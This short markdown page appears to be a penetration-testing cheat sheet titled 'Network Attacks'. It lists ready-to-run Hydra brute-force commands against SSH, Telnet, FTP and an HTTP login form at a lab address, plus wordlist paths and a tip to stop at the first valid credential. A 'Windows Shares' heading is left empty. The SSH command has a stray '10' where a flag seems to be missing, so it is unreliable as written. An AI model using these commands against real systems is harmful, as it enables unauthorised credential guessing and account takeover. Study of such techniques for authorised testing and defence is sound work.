---
description: 'SSH, Telnet, RDP, HTTP auth, Windows shares'
---

# Network Attacks

## Hydra

### SSH

```text
hydra -L users.txt -P pass.txt 10 10.10.10.10 ssh
```

### Telnet

```text
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### FTP

```text
hydra -L users.txt -P pass.txt ftp://10.10.10.10
```

### POST form login

```text
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt
```

Add`-f` to stop the brute-forcing after finding one valid cred.

* /usr/share/seclists/Passwords/rockyou-10.txt
* /usr/share/seclists/Passwords/rockyou-15.txt The above password lists are recommended to run first before the larger rockyou.txt
* /usr/share/ncrack/minimal.usr for users list.

## Windows Shares



